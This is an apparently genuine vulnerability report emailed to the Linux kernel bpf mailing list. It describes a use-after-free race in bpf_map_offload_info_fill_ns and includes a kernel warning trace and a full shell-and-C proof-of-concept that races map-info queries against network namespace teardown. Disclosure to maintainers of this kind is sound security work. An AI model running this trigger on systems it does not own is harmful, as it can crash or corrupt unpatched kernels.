Return-Path: <bpf+bounces-73947-lists+bpf=lfdr.de@vger.kernel.org>
X-Original-To: lists+bpf@lfdr.de
Delivered-To: lists+bpf@lfdr.de
Received: from sv.mirrors.kernel.org (sv.mirrors.kernel.org [IPv6:2604:1380:45e3:2400::1])
	by mail.lfdr.de (Postfix) with ESMTPS id BE25FC3F1C6
	for <lists+bpf@lfdr.de>; Fri, 07 Nov 2025 10:15:29 +0100 (CET)
Received: from smtp.subspace.kernel.org (relay.kernel.org [52.25.139.140])
	(using TLSv1.2 with cipher ECDHE-ECDSA-AES256-GCM-SHA384 (256/256 bits))
	(No client certificate requested)
	by sv.mirrors.kernel.org (Postfix) with ESMTPS id 778333A18D7
	for <lists+bpf@lfdr.de>; Fri,  7 Nov 2025 09:15:28 +0000 (UTC)
Received: from localhost.localdomain (localhost.localdomain [127.0.0.1])
	by smtp.subspace.kernel.org (Postfix) with ESMTP id 40EFF1D516C;
	Fri,  7 Nov 2025 09:15:22 +0000 (UTC)
X-Original-To: bpf@vger.kernel.org
Received: from zg8tmja2lje4os43os4xodqa.icoremail.net (zg8tmja2lje4os43os4xodqa.icoremail.net [206.189.79.184])
	by smtp.subspace.kernel.org (Postfix) with ESMTP id 6285E1EE033
	for <bpf@vger.kernel.org>; Fri,  7 Nov 2025 09:15:16 +0000 (UTC)
Authentication-Results: smtp.subspace.kernel.org; arc=none smtp.client-ip=206.189.79.184
ARC-Seal:i=1; a=rsa-sha256; d=subspace.kernel.org; s=arc-20240116;
	t=1762506922; cv=none; b=FEv4+zmVOzAuGt00HVUvn4fzyWn5lAqN9xCmKcemf+DTwMUlxwkqA280B9HmWqCe+NF+bDNTgF5ePhyZoE/63TDHT41CISYqKsRQhINEym4GePrg5va1MZ2L3Dj47/z/tQm6ZBwltQ5c+2N2udfXv4pdIqqv7ZJcGoeMMl5aGg4=
ARC-Message-Signature:i=1; a=rsa-sha256; d=subspace.kernel.org;
	s=arc-20240116; t=1762506922; c=relaxed/simple;
	bh=g/dVZugzC/vFWavalM6YmlGCBLt4RwmA4W3SboQqt8E=;
	h=Message-ID:Date:MIME-Version:To:Cc:From:Subject:Content-Type; b=VALxdcFkWmSQp0JI1FfbQRDT5Kh4Nn9eLKHC+5/V3pPUR2ZFQTPLKn1KOV+2lG48cY98GxFjUJO1Tn5LUHXCWzMPc1ohH6TPKGFtRQEvCbMTMQBT4v4faWlkhi5Q+k9/gj4vTgVeqW1ZGj7gGPBm3Tuskyg4VP/RDpi4ClC5p9M=
ARC-Authentication-Results:i=1; smtp.subspace.kernel.org; dmarc=none (p=none dis=none) header.from=hust.edu.cn; spf=pass smtp.mailfrom=hust.edu.cn; arc=none smtp.client-ip=206.189.79.184
Authentication-Results: smtp.subspace.kernel.org; dmarc=none (p=none dis=none) header.from=hust.edu.cn
Authentication-Results: smtp.subspace.kernel.org; spf=pass smtp.mailfrom=hust.edu.cn
Received: from hust.edu.cn (unknown [172.16.0.52])
	by app2 (Coremail) with SMTP id HwEQrAA3PqaAuA1pi0zpAA--.6275S2;
	Fri, 07 Nov 2025 17:14:40 +0800 (CST)
Received: from [58.206.214.186] (unknown [58.206.214.186])
	by gateway (Coremail) with SMTP id _____wA3App4uA1pXU_gAw--.2007S2;
	Fri, 07 Nov 2025 17:14:33 +0800 (CST)
Message-ID: <f0aa3678-79c9-47ae-9e8c-02a3d1df160a@hust.edu.cn>
Date: Fri, 7 Nov 2025 17:14:32 +0800
Precedence: bulk
X-Mailing-List: bpf@vger.kernel.org
List-Id: <bpf.vger.kernel.org>
List-Subscribe: <mailto:bpf+subscribe@vger.kernel.org>
List-Unsubscribe: <mailto:bpf+unsubscribe@vger.kernel.org>
MIME-Version: 1.0
User-Agent: Mozilla Thunderbird
To: Daniel Borkmann <daniel@iogearbox.net>, bpf <bpf@vger.kernel.org>
Cc: dzm91@hust.edu.cn, M202472210@hust.edu.cn,
 hust-os-kernel-patches@googlegroups.com, Alexei Starovoitov
 <ast@kernel.org>, Andrii Nakryiko <andrii@kernel.org>
From: Yinhao Hu <dddddd@hust.edu.cn>
Subject: net: bpf: use-after-free in bpf_map_offload_info_fill_ns when
 obtaining netns for offloaded map
Content-Type: text/plain; charset=UTF-8
Content-Transfer-Encoding: 8bit
X-CM-TRANSID:HwEQrAA3PqaAuA1pi0zpAA--.6275S2
Authentication-Results: app2; spf=neutral smtp.mail=dddddd@hust.edu.cn
	;
X-Coremail-Antispam: 1UD129KBjvJXoWfGFW5Ww4UuFW3JrWDtw18Xwb_yoWDKr1rpF
	yYkF15GF48J398Gr4UAa4UZw1ayrsrZa1UWr4xG340yF17Xw13Jay8tFWjvF95trWDArW2
	yr47J3WFkFs8AaUanT9S1TB71UUUUjUqnTZGkaVYY2UrUUUUjbIjqfuFe4nvWSU5nxnvy2
	9KBjDU0xBIdaVrnRJUUUm0b7Iv0xC_Kw4lb4IE77IF4wAFc2x0x2IEx4CE42xK8VAvwI8I
	cIk0rVWrJVCq3wA2ocxC64kIII0Yj41l84x0c7CEw4AK67xGY2AK021l84ACjcxK6xIIjx
	v20xvE14v26w1j6s0DM28EF7xvwVC0I7IYx2IY6xkF7I0E14v26r4UJVWxJr1l84ACjcxK
	6I8E87Iv67AKxVW0oVCq3wA2z4x0Y4vEx4A2jsIEc7CjxVAFwI0_GcCE3s1ln4kS14v26r
	1Y6r17M2AIxVAIcxkEcVAq07x20xvEncxIr21l57IF6xkI12xvs2x26I8E6xACxx1l5I8C
	rVACY4xI64kE6c02F40Ex7xfMcIj64x0Y40En7xvr7AKxVW8Jr0_Cr1UMcIj6x8ErcxFaV
	Av8VW8uFyUJr1UMcIj6xkF7I0En7xvr7AKxVW8Jr0_Cr1UMcvjeVCFs4IE7xkEbVWUJVW8
	JwACjcxG0xvEwIxGrwCY1x0262kKe7AKxVWUAVWUtwCF04k20xvY0x0EwIxGrwCF04k20x
	vE74AGY7Cv6cx26r4fZr1UJr1l4I8I3I0E4IkC6x0Yz7v_Jr0_Gr1l4IxYO2xFxVAFwI0_
	Jrv_JF1lx2IqxVAqx4xG67AKxVWUJVWUGwC20s026x8GjcxK67AKxVWUGVWUWwC2zVAF1V
	AY17CE14v26r126r1DMIIYrxkI7VAKI48JMIIF0xvE2Ix0cI8IcVAFwI0_Jr0_JF4lIxAI
	cVC0I7IYx2IY6xkF7I0E14v26r1j6r4UMIIF0xvE42xK8VAvwI8IcIk0rVWUJVWUCwCI42
	IY6I8E87Iv67AKxVWUJVW8JwCI42IY6I8E87Iv6xkF7I0E14v26r1j6r4UYxBIdaVFxhVj
	vjDU0xZFpf9x07bIqXLUUUUU=
X-CM-SenderInfo: bgsqjkiyqyjko6kx23oohg3hdfq/

When querying info for an offloaded BPF map,
bpf_map_offload_info_fill_ns() obtains the network namespace with
`get_net(dev_net(offmap->netdev))` while the associated netdev can be
racing with teardown during netns destruction. If the netns refcount
already reached 0, get_net() performs a refcount_t increment on 0,
triggering `refcount_t: addition on 0; use-after-free`.

Reported-by: Yinhao Hu <dddddd@hust.edu.cn>
Reported-by: Kaiyan Mei <M202472210@hust.edu.cn>
Reviewed-by: Dongliang Mu <dzm91@hust.edu.cn>

```c
static struct ns_common *bpf_map_offload_info_fill_ns(void *private_data)
{
    struct ns_get_path_bpf_map_args *args = private_data;
    struct ns_common *ns;
    struct net *net;

    rtnl_lock();
    down_read(&bpf_devs_lock);

    if (args->offmap->netdev) {
        args->info->ifindex = args->offmap->netdev->ifindex;
        net = dev_net(args->offmap->netdev);
        get_net(net); // can refcount++ on a netns whose refcount
already hit 0
        ns = &net->ns;
    }
    // ...
}
```

## Reproduction Steps
- Create an offload‑capable netdev (netdevsim) inside a new netns.
- Create an offloaded BPF map bound to that netdev and pass the map fd
to the parent via a Unix socket.
- Exit the child to trigger netns teardown while the parent concurrently
calls `BPF_OBJ_GET_INFO_BY_FD` on the map fd in multiple threads.
- Observe refcount_t warning on `get_net()` in
`bpf_map_offload_info_fill_ns()`.

## KASAN Report

```
[   56.099386] ------------[ cut here ]------------
[   56.099749] refcount_t: addition on 0; use-after-free.
[   56.100128] WARNING: lib/refcount.c:25 at
refcount_warn_saturate+0xce/0x150, CPU#0: poc_final/362
[   56.100823] Modules linked in:
[   56.101050] CPU: 0 UID: 0 PID: 362 Comm: poc_final Not tainted
6.18.0-rc4-next-20251103 #7 PREEMPT(none)
[   56.101777] Hardware name: QEMU Ubuntu 24.04 PC (i440FX + PIIX,
1996), BIOS 1.16.3-debian-1.16.3-2 04/01/2014
[   56.102528] RIP: 0010:refcount_warn_saturate+0xce/0x150
[   56.102900] Code: db c1 3f 05 01 e8 e2 54 4d fe 0f 0b eb b1 80 3d ce
c1 3f 05 00 75 a8 48 c7 c7 60 91 1d 86 c6 05 be c1 3f 05 01 e8 c2 54 4d
fe <0f> 0b eb 91 80 3d ad c1 3f 05 00 75 88 48 c7 c7 c0 91 1d 86 c6 05
[   56.104261] RSP: 0018:ffff888109ed78b8 EFLAGS: 00010282
[   56.104631] RAX: 0000000000000000 RBX: ffff88810a17e9b4 RCX:
0000000000000000
[   56.105128] RDX: 0000000000000002 RSI: 0000000000000004 RDI:
0000000000000001
[   56.105692] RBP: 0000000000000002 R08: 0000000000000001 R09:
ffffed1023585a21
[   56.106185] R10: ffff88811ac2d10b R11: 746e756f63666572 R12:
0000000000000008
[   56.106752] R13: dffffc0000000000 R14: ffffffff86cb9724 R15:
ffff88810ac6b438
[   56.107318] FS:  00007a10568a7700(0000) GS:ffff888191202000(0000)
knlGS:0000000000000000
[   56.107886] CS:  0010 DS: 0000 ES: 0000 CR0: 0000000080050033
[   56.108353] CR2: 00007a10550a3fb8 CR3: 0000000106084000 CR4:
0000000000750ef0
[   56.108870] PKRU: 55555554
[   56.109069] Call Trace:
[   56.109315]  <TASK>
[   56.109475]  bpf_map_offload_info_fill_ns+0x1fc/0x260
[   56.109842]  ns_get_path_cb+0x11/0x40
[   56.110107]  bpf_map_offload_info_fill+0x98/0x250
[   56.110508]  ? __pfx_bpf_map_offload_info_fill+0x10/0x10
[   56.110887]  ? __pfx_bpf_check_uarg_tail_zero+0x10/0x10
[   56.111328]  bpf_map_get_info_by_fd.isra.0+0x5e1/0x6d0
[   56.111701]  ? __pfx_bpf_map_get_info_by_fd.isra.0+0x10/0x10
[   56.112101]  ? __pfx___sys_bpf+0x10/0x10
[   56.112447]  ? srso_alias_return_thunk+0x5/0xfbef5
[   56.112797]  ? __pfx_bpf_check_uarg_tail_zero+0x10/0x10
[   56.113162]  ? srso_alias_return_thunk+0x5/0xfbef5
[   56.113566]  ? fdget+0x2c5/0x3b0
[   56.113812]  __sys_bpf+0x3d0e/0x5110
[   56.114075]  ? __pfx___sys_bpf+0x10/0x10
[   56.114422]  ? srso_alias_return_thunk+0x5/0xfbef5
[   56.114769]  ? srso_alias_return_thunk+0x5/0xfbef5
[   56.115106]  ? do_syscall_64+0x94/0x3b0
[   56.115450]  ? srso_alias_return_thunk+0x5/0xfbef5
[   56.115797]  ? __sys_bpf+0x17eb/0x5110
[   56.116065]  ? do_syscall_64+0x94/0x3b0
[   56.116407]  ? srso_alias_return_thunk+0x5/0xfbef5
[   56.116755]  __x64_sys_bpf+0x74/0xc0
[   56.117010]  do_syscall_64+0x76/0x3b0
[   56.117332]  ? srso_alias_return_thunk+0x5/0xfbef5
[   56.117671]  ? srso_alias_return_thunk+0x5/0xfbef5
[   56.118005]  ? srso_alias_return_thunk+0x5/0xfbef5
[   56.118413]  ? do_syscall_64+0x94/0x3b0
[   56.118700]  ? srso_alias_return_thunk+0x5/0xfbef5
[   56.119036]  ? srso_alias_return_thunk+0x5/0xfbef5
[   56.119440]  ? srso_alias_return_thunk+0x5/0xfbef5
[   56.119791]  ? do_syscall_64+0x94/0x3b0
[   56.120064]  ? srso_alias_return_thunk+0x5/0xfbef5
[   56.120473]  ? do_syscall_64+0x94/0x3b0
[   56.120761]  ? srso_alias_return_thunk+0x5/0xfbef5
[   56.121106]  ? do_syscall_64+0x94/0x3b0
[   56.121445]  entry_SYSCALL_64_after_hwframe+0x76/0x7e
[   56.121826] RIP: 0033:0x7a105c9abfc9
[   56.122086] Code: 00 c3 66 2e 0f 1f 84 00 00 00 00 00 0f 1f 44 00 00
48 89 f8 48 89 f7 48 89 d6 48 89 ca 4d 89 c2 4d 89 c8 4c 8b 4c 24 08 0f
05 <48> 3d 01 f0 ff ff 73 01 c3 48 8b 0d 97 8e 0d 00 f7 d8 64 89 01 48
[   56.123453] RSP: 002b:00007a10568a6e08 EFLAGS: 00000246 ORIG_RAX:
0000000000000141
[   56.123995] RAX: ffffffffffffffda RBX: 0000000000002f2b RCX:
00007a105c9abfc9
[   56.124569] RDX: 0000000000000078 RSI: 00007a10568a6e60 RDI:
000000000000000f
[   56.125097] RBP: 0000000000000000 R08: 0000000000000000 R09:
0000000000000000
[   56.125689] R10: 0000000000000000 R11: 0000000000000246 R12:
0000000000002f2c
[   56.126210] R13: 00007ffd3bcff14f R14: 00007a10568a6fc0 R15:
0000000000802000
[   56.126794]  </TASK>
[   56.126963] ---[ end trace 0000000000000000 ]---
[   56.127366] ------------[ cut here ]------------
```

## Proof of Concept

The following C program should demonstrate the vulnerability on
linux-next 6.18.0-rc4-next-20251103:

```sh
#!/bin/bash

set -e

if [ "$EUID" -ne 0 ]; then
    echo "Please run as root" >&2
    exit 1
fi

cat > /tmp/poc_final.c << 'EOF'
#define _GNU_SOURCE
#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <unistd.h>
#include <errno.h>
#include <sched.h>
#include <pthread.h>
#include <sys/syscall.h>
#include <sys/wait.h>
#include <sys/mount.h>
#include <sys/socket.h>
#include <sys/ioctl.h>
#include <sys/stat.h>
#include <net/if.h>
#include <linux/bpf.h>
#include <fcntl.h>

#ifndef __NR_bpf
#define __NR_bpf 321
#endif

static int bpf(int cmd, union bpf_attr *attr, unsigned int size)
{ return syscall(__NR_bpf, cmd, attr, size); }

static int create_offload_map(int ifindex)
{
    union bpf_attr attr = {};
    attr.map_type = BPF_MAP_TYPE_ARRAY;
    attr.key_size = 4;
    attr.value_size = 4;
    attr.max_entries = 2;
    attr.map_ifindex = ifindex;
    return bpf(BPF_MAP_CREATE, &attr, sizeof(attr));
}

static int get_map_info(int map_fd)
{
    struct bpf_map_info info = {};
    union bpf_attr attr = {};
    attr.info.bpf_fd = map_fd;
    attr.info.info_len = sizeof(info);
    attr.info.info = (__u64)&info;
    return bpf(BPF_OBJ_GET_INFO_BY_FD, &attr, sizeof(attr));
}

static int write_file(const char *path, const char *data)
{
    int fd = open(path, O_WRONLY);
    if (fd < 0) return -1;
    int ret = write(fd, data, strlen(data));
    close(fd);
    return ret < 0 ? -1 : 0;
}

static volatile int should_stop = 0;
static int shared_map_fd = -1;
static int trigger_count = 0;

void *info_getter_thread(void *arg)
{
    int count = 0, success_count = 0;
    while (!should_stop && shared_map_fd > 0) {
        int ret = get_map_info(shared_map_fd);
        count++;
        if (ret == 0) success_count++;
        if (count % 100000 == 0)
            printf("[getter] %d attempts, %d succeeded\n", count,
success_count);
    }
    printf("[getter] Thread finished: %d attempts, %d succeeded\n",
count, success_count);
    trigger_count += success_count;
    return NULL;
}

int main(void)
{
    pthread_t threads[16];
    pid_t child_pid;
    int sockfds[2];

    if (socketpair(AF_UNIX, SOCK_STREAM, 0, sockfds) < 0) {
        perror("socketpair");
        return 1;
    }

    child_pid = fork();
    if (child_pid < 0) { perror("fork"); return 1; }

    if (child_pid == 0) {
        close(sockfds[1]);
        if (unshare(CLONE_NEWNET | CLONE_NEWNS) < 0) {
perror("unshare"); exit(1); }
        (void)mount("none", "/sys", NULL, MS_PRIVATE | MS_REC, NULL);
        if (access("/sys/bus/netdevsim/new_device", F_OK) != 0) exit(1);
        char dev_id[32]; snprintf(dev_id, sizeof(dev_id), "%d 1",
getpid() % 1000);
        if (write_file("/sys/bus/netdevsim/new_device", dev_id) < 0)
exit(1);
        sleep(1);

        int ifindex = -1; FILE *fp = fopen("/proc/net/dev", "r");
        if (fp) {
            char line[256]; fgets(line, sizeof(line), fp); fgets(line,
sizeof(line), fp);
            while (fgets(line, sizeof(line), fp)) {
                char ifname[32];
                if (sscanf(line, " %31[^:]:", ifname) == 1) {
                    if (!strcmp(ifname, "lo")) continue;
                    int sock = socket(AF_INET, SOCK_DGRAM, 0);
                    if (sock >= 0) {
                        struct ifreq ifr = {0};
                        strncpy(ifr.ifr_name, ifname, IFNAMSIZ-1);
                        if (ioctl(sock, SIOCGIFINDEX, &ifr) == 0) {
                            int test_fd =
create_offload_map(ifr.ifr_ifindex);
                            close(sock);
                            if (test_fd >= 0) { ifindex =
ifr.ifr_ifindex; close(test_fd); break; }
                        } else close(sock);
                    }
                }
            }
            fclose(fp);
        }
        if (ifindex < 0) exit(1);

        int child_map_fd = create_offload_map(ifindex);
        if (child_map_fd < 0) exit(1);

        struct msghdr msg = {0}; struct cmsghdr *cmsg; char
buf[CMSG_SPACE(sizeof(int))];
        char dummy = 'X'; struct iovec iov = { .iov_base = &dummy,
.iov_len = 1 };
        msg.msg_iov = &iov; msg.msg_iovlen = 1; msg.msg_control = buf;
msg.msg_controllen = sizeof(buf);
        cmsg = CMSG_FIRSTHDR(&msg); cmsg->cmsg_level = SOL_SOCKET;
cmsg->cmsg_type = SCM_RIGHTS; cmsg->cmsg_len = CMSG_LEN(sizeof(int));
        memcpy(CMSG_DATA(cmsg), &child_map_fd, sizeof(int));
        if (sendmsg(sockfds[0], &msg, 0) < 0) exit(1);
        sleep(2);
        close(child_map_fd); close(sockfds[0]);
        exit(0);
    }

    close(sockfds[0]);
    struct msghdr msg = {0}; struct cmsghdr *cmsg; char
buf[CMSG_SPACE(sizeof(int))]; char dummy; struct iovec iov = { .iov_base
= &dummy, .iov_len = 1 };
    msg.msg_iov = &iov; msg.msg_iovlen = 1; msg.msg_control = buf;
msg.msg_controllen = sizeof(buf);
    if (recvmsg(sockfds[1], &msg, 0) < 0) { perror("recvmsg"); return 1; }
    cmsg = CMSG_FIRSTHDR(&msg); if (!cmsg || cmsg->cmsg_type !=
SCM_RIGHTS) return 1;
    memcpy(&shared_map_fd, CMSG_DATA(cmsg), sizeof(int));

    for (int i = 0; i < 16; i++) pthread_create(&threads[i], NULL,
info_getter_thread, NULL);
    int status; waitpid(child_pid, &status, 0);
    sleep(10);
    should_stop = 1;
    for (int i = 0; i < 16; i++) pthread_join(threads[i], NULL);
    close(shared_map_fd); close(sockfds[1]);
    return 0;
}
EOF

gcc -O2 -o /tmp/poc_final /tmp/poc_final.c -lpthread
/tmp/poc_final || true
dmesg | grep -E "refcount|use-after-free" || true
```


